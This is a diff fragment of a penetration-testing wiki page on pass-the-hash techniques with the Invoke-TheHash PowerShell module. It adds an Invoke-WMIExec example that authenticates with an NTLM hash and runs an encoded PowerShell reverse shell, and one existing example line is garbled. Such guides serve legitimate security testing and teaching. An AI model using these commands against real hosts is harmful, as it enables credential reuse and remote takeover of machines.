@@ -259,8 +259,14 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 
 This function is a **mix of all the others**. You can pass **several hosts**, **exclude** someones and **select** the **option** you want to use (_SMBExec, WMIExec, SMBClient, SMBEnum_). If you select **any** of **SMBExec** and **WMIExec** but you **don't** give any _**Command**_ parameter it will just **check** if you have **enough permissions**.
 
-```
+```BASH
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
+
+## Invoke-TheHash with WMI
+Import-Module .\Invoke-TheHash.psd1
+Invoke-WMIExec -Target <IP> -Domain <Domain> -Username <user> -Hash <NTLM_hash> -Command "powershell -e <PS_reverse_shell>"
+
+# -<DOMAIN> is unnecessary with local accounts or when using the @domain after the username.
 ```
 
 ### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
